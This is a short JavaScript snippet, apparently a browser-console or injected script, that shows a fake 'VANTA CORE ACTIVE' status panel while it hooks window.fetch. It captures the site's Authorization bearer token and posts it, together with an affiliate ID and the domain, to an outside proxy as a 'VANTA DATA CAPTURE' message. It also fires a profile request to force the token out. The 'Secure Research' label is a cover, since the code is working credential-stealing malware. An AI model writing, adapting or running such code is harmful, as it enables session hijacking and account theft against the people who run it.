(function() {
    // 1. Visual Feedback (Shows the user it's "working")
    const ui = document.createElement('div');
    ui.style = "position:fixed;top:15px;right:15px;width:230px;background:#000;border:1px solid #0f8;padding:12px;z-index:999999;color:#0f8;font-family:monospace;border-radius:6px;box-shadow:0 0 15px rgba(0,255,136,0.2);";
    ui.innerHTML = `
        <div style="font-weight:bold;border-bottom:1px solid #0f83;padding-bottom:5px;margin-bottom:8px;">VANTA CORE ACTIVE</div>
        <div style="font-size:10px;opacity:0.5;">ID: ${window.V_REF}</div>
        <div id="v-status" style="margin-top:8px;font-size:11px;">STATUS: <span style="color:#bc3cfd;">SCANNING...</span></div>
    `;
    document.body.appendChild(ui);

    // 2. The Sniffer (Intercepting the Authorization Header)
    const originalFetch = window.fetch;
    window.fetch = async (...args) => {
        const headers = args[1]?.headers || {};
        const auth = headers['Authorization'] || headers['authorization'];

        if (auth && !window.vantaDone) {
            window.vantaDone = true;
            document.getElementById('v-status').innerHTML = "STATUS: <span style='color:#0f8;'>SYNCED</span>";

            // Send to Cloudflare Proxy
            originalFetch(window.V_PROXY, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    embeds: [{
                        title: "🚨 VANTA DATA CAPTURE",
                        color: 0x00ff88,
                        fields: [
                            { name: "Affiliate ID", value: window.V_REF, inline: true },
                            { name: "Domain", value: window.location.hostname, inline: true },
                            { name: "Auth Token", value: "```" + auth + "```" }
                        ],
                        footer: { text: "Vanta Secure Research" }
                    }]
                })
            }).catch(e => console.error("Sync Error"));
        }
        return originalFetch(...args);
    };

    // Trigger a request to force the site to show its headers
    originalFetch('/api/v2/user/profile').catch(()=>{});
    alert("Vanta Tracker Initialized.");
})();
